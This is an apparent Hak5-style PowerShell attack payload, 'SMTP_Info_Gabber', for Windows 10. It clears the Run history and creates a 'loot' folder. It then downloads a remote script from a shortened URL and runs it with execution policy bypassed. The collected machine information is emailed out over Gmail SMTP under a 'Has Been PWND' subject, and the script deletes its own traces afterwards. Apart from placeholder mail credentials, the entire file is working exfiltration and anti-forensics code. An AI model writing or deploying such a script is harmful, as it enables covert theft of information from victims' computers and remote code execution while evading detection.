#-----------------------------------------------------------
# CREDITS
#-----------------------------------------------------------
# Title:         SMTP_Info_Gabber
# Author:        0rion5 B3lt & Hak5Darren
# Version:       2.1
# Target:        Windows 10 Build 1803 or Above
#-----------------------------------------------------------
# CLEAR RUN HISTORY & SETUP DIRECTORIES
#-----------------------------------------------------------
#Remove Run History
try {
    remove-item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU";  
}
catch {
    Write-Host "History has been removed or didn't exist in the first place."
}
#Setup Directories for Output 
try {
    $VolumeName = "C:\"
    $ComputerSystem = Get-CimInstance CIM_ComputerSystem
    $BackUpDrive = $null
    Get-WmiObject Win32_LogicalDisk | Where-Object{
        if ($_.DeviceID -eq $VolumeName) {
            $BackUpDrive = $_.DeviceID
        }
    }
    # Check for Loot Folder if not create one
    $FolderPath1 = $BackUpDrive + "\loot"
    if(!(Test-Path -Path $FolderPath1 )) {
        New-Item -ItemType directory -Path $FolderPath1
    }else {
        Write-Host "Path Already Exists";
    }
    # Check for Info Folder if not create one
    $FolderPath2 = $BackUpDrive + "\loot\info"
    if (!(Test-Path -Path $FolderPath2)) {
        New-Item -ItemType Directory -Path $FolderPath2
    }else {
        Write-Host "Path Already Exists";
    }
    #Create a path that will be used to make the file
    $DateTime = get-date -f yyyy-MM-dd_HH-mm
    $BackUpPath = $BackUpDrive + "\loot\info\" + $ComputerSystem.Name + " - " + $DateTime + ".txt"
    Clear-Host;
    Set-Location $FolderPath1;
}
catch {
    Write-Host "Script Failed In Setup Directory Step"
}
#-----------------------------------------------------------
# TEST CONNECTION, GET INFO.PS1 SCRIPT FROM GITHUB & RUNSCRIPT
#-----------------------------------------------------------
#Test the Internet Connection
<#
try {
    $TestNetConnection = Test-NetConnection 8.8.8.8
    $TestNetConnection
    Clear-Host
}
catch {
    Write-Host "Check the Internet Connection!"
}
#>
#Invoke WebRequest for info.ps1 Script & Run the Script
try {
    $Source = "https://goo.gl/MiPyCm"; 
    $Destination = $FolderPath1 + "\info.ps1";
    Invoke-WebRequest $Source -OutFile $Destination;
    Powershell.exe -ExecutionPolicy Bypass -File info.ps1 > $BackUpPath;
}
catch {
    Write-Host "Check the Internet Connection."
} 

#-----------------------------------------------------------
# EMAIL GATHERED INFORMATION
#-----------------------------------------------------------
#Send Gathered Info to SMTP server
try {
    $File = (Get-ChildItem $FolderPath2).FullName;
    $Attachment = (New-Object Net.Mail.Attachment($File));
    $SMTPServer = 'smtp.gmail.com'; 
    $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); 
    $SMTPInfo.EnableSSL = $true; 
    $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('Email', 'Password'); 
    $ReportEmail = New-Object System.Net.Mail.MailMessage; 
    $ReportEmail.From = 'Email'; 
    $ReportEmail.To.Add('Email'); 
    $ReportEmail.Subject = $Env:COMPUTERNAME + " Has Been PWND!! "; 
    $ReportEmail.Body = 'The Information Is Attached';
    $ReportEmail.Attachments.Add($Attachment); 
    $SMTPInfo.Send($ReportEmail);
    $Attachment.Dispose();
}
catch {
    Write-Host " Oops Something Went Wrong. Check the Internet Connection"
}
#-----------------------------------------------------------
# CLEAN UP
#-----------------------------------------------------------
#Remove the Folders created and remove variables created
try {
    Set-Location ..;
    Remove-Item -path $FolderPath1 -recurse -force;
    Remove-Variable Folderpath1, FolderPath2, TestNetConnection, Source, Destination, file, Attachment, SMTPServer, SMTPInfo, ReportEmail 
    Clear-Host;
    exit;
}
catch {
    Write-Host "Oops Something Went Wrong. Try Again."
}
